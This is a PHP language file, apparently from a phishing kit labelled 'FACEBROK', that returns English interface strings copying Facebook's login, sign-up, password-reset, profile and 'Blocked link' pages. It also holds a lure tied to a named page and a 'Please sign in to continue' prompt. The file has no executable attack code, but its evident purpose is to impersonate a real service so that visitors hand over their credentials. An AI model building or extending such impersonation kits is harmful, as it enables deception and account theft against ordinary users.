<?php

	// FACEBROK LANGUAGE


function defined_text($text){
	if($text == "email_or_phone")      {return $text = "Email or Phone:";}
	if($text == "welcome_to_facebook") {return $text = "Welcome to Facebook - Log In, Sign Up or Learn More";}
	if($text == "password")            {return $text = "Password:";}
	if($text == "forge_account")       {return $text = "Forgot account?";}
	if($text == "log_in")              {return $text = "Log In";}
	if($text == "sign_up")             {return $text = "Sign Up";}
	if($text == "free_ever")           {return $text = "It's free and always will be.";}
	if($text == "first_name")          {return $text = "Name";}
	if($text == "last_name")           {return $text = "Last name";}
	if($text == "mobil_or_email")      {return $text = "Mobile number or email";}
	if($text == "re_mobil_or_email")   {return $text = "Re-enter mobile number or email";}
	if($text == "new_password")        {return $text = "New password";}
	if($text == "birthday")            {return $text = "Birthday";}
	if($text == "month")               {return $text = "Month";}
	if($text == "day")                 {return $text = "Day";}
	if($text == "year")                {return $text = "Year";}
	if($text == "what_need_my_bir")    {return $text = "Why do I need to provide my birthday?";}
	if($text == "female")              {return $text = "Female";}
	if($text == "male")                {return $text = "Male";}
	if($text == "by_clicking_sign")    {return $text = "By clicking Sign Up, you agree to our";}
	if($text == "terms")               {return $text = "Terms";}
	if($text == "and_that_you")        {return $text = "and that you have read our";}
	if($text == "data_policy")         {return $text = "Data Policy";}
	if($text == "inclufing_our")       {return $text = "including our";}
	if($text == "cookie_use")          {return $text = "Cookie Use";}
	if($text == "thanks_for_exit")     {return $text = "Thanks for stopping by!";}
	if($text == "we_hope_to_see")      {return $text = "We hope to see you again soon.";}
	if($text == "create_a_page")       {return $text = "Create a Page";}
	if($text == "for_business")        {return $text = "for a celebrity, band or business";}
	if($text == "log_into_facebook")   {return $text = "Log into Facebook";}
	if($text == "log_up_into_face")    {return $text = "Sign up for Facebook";}
	if($text == "create_new_account")  {return $text = "Create New Account";}
	if($text == "create_account")      {return $text = "Create Account";}
	if($text == "forge_password")      {return $text = "Forgot Password?";}
	if($text == "help_center")         {return $text = "Help Center";}
	if($text == "see_nickimaj")        {return $text = "See more of nickimaj Model by logging into Facebook";}
	if($text == "msg_nickimaj")        {return $text = "Message this Page, learn about upcoming events and more. If you don't have a Facebook account, you can create one to see more of this Page.";}
	if($text == "not_now")             {return $text = "Not Now";}
	if($text == "not_logged")          {return $text = "Not logged.";}
	if($text == "pls_not_logged")      {return $text = "Please sign in to continue.";}
	if($text == "home")                {return $text = "Home";}
	if($text == "about")               {return $text = "About";}
	if($text == "photos")              {return $text = "Photos";}
	if($text == "likes")               {return $text = "Likes";}
	if($text == "videos")              {return $text = "Videos";}
	if($text == "post")                {return $text = "Post";}
	if($text == "like")                {return $text = "Like";}
	if($text == "save")                {return $text = "Save";}
	if($text == "share")               {return $text = "Share";}
	if($text == "more")                {return $text = "More";}
	if($text == "public_figure")       {return $text = "Public Figure";}
	if($text == "blocked_link")        {return $text = "Blocked link";}
	if($text == "blocked_link_msg")    {return $text = "We believe that the link you are trying to access is malicious. For your security, we have locked. Learn how to protect your account. If you think this link should not be blocked, let us know.";}
	if($text == "back")                {return $text = "back";}
	if($text == "search_people")       {return $text = "Search for people, places and things";}
	if($text == "outting")             {return $text = "Leaving facebook...";}
	if($text == "is_on_facebook")      {return $text = "is on Facebook";}
	if($text == "to_connect_with")     {return $text = "To connect with";}
	if($text == "sign_up_with_face")   {return $text = "sign up for Facebook today";}
	if($text == "friends")             {return $text = "Friends";}
	if($text == "log_in_for_photos")   {return $text = "Log in or Create an account to see photos of";}
	if($text == "other_named")         {return $text = "Others Named";}
	if($text == "favorites")           {return $text = "Favorites";}
	if($text == "no_info")             {return $text = "No information to display";}
	if($text == "info_contact")        {return $text = "Contact information";}
	if($text == "other")               {return $text = "Others";}
	if($text == "no_info_contact")     {return $text = "No contact information to display";}
	if($text == "no_pages")            {return $text = "No Pages to show";}

}
?>